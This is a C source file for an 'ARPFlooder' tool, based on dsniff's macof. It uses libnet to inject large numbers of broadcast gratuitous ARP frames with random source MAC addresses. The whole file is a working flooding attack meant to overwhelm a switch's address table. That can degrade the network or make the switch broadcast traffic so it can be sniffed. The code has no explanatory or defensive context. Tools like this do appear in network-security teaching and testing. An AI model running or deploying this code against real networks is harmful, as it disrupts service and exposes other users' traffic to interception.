/*
 *Inspired from macof.c (dsniff library)
 *
 *"Perl macof originally written by Ian Vitek <ian.vitek@infosec.se>.
 *
 *Copyright (c) 1999 Dug Song <dugsong@monkey.org>"
 */

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

static void usage(void){
printf("ARPFlooder <nb of repetitions>\n");
  exit(1);
}

static void gen_mac(u_char *mac){
  *((in_addr_t *)mac) = libnet_get_prand(LIBNET_PRu32);
	*((u_short *)(mac + 4)) = libnet_get_prand(LIBNET_PRu16);
}

int main(int argc, char *argv[]){

  if(argc != 2)
    usage();

  int i;
  char *intrfc = NULL;   // The name of the network interface
  char libneterrorbuffer[LIBNET_ERRBUF_SIZE];  
  char pcaperrorbuffer[PCAP_ERRBUF_SIZE];
  libnet_t *context;
  u_char destmacaddr[ETHER_ADDR_LEN]; //destination address
  u_char srcmacaddr[ETHER_ADDR_LEN]; //source address

  //initialize the interface we look upon
  intrfc = pcap_lookupdev(pcaperrorbuffer);

  //initialize the libnet context in which we operate
  if ((context = libnet_init(LIBNET_LINK, intrfc, libneterrorbuffer)) == NULL){
    errx(1, "%s", libneterrorbuffer);
  }

  //create the random seed in the libnet context
  libnet_seed_prand(context);

  //n is the number of mac adresses we'll send to the switch
  int n = atoi(argv[1]);

  for (i = 0; i < n; i++){

    //generate random destination and source mac addresses
    memset(destmacaddr, 255, 6);
    gen_mac(srcmacaddr);

    uint8_t ip[4];
    bzero(ip, 4);

    //build gratuitous ARP
    libnet_build_arp(ARPHRD_ETHER,         //hardware addr
                      ETHERTYPE_IP,        //protocol addr
                      6,                   //hardware addr size
                      4,                   //protocol addr size
                      2,                   //operation type (example : 2 for Gratuitous ARP)
                      srcmacaddr,          //sender hardware addr
                      ip,                  //sender protocol addr
                      srcmacaddr,          //target hardware addr
                      ip,                  //target protocol addr
                      NULL,                //payload
                      0,                   //payload length
                      context,             //pointer to libnet context
                      0);                  //header protocol tag (0 to build a new one)

    libnet_build_ethernet(destmacaddr,     //destination ethernet address
                          srcmacaddr,      //source ethernet address
                          ETHERTYPE_ARP,   //upper layer protocol type
                          NULL,            //payload
                          0,               //payload length
                          context,         //pointer to libnet context
                          0);              //header protocol tag (0 to build a new one)

    //packet injection
    if (libnet_write(context) < 0)
      errx(1, "Error during packet injection");

    //clear the context in order for another injection
    libnet_clear_packet(context);

    usleep(1000); //Need to wait for a while, for the requests to be processed
    printf(" Number of injections: %d\r", i+1);
  }
  printf(" Number of injections: %d\n", n);
  return 1;
}
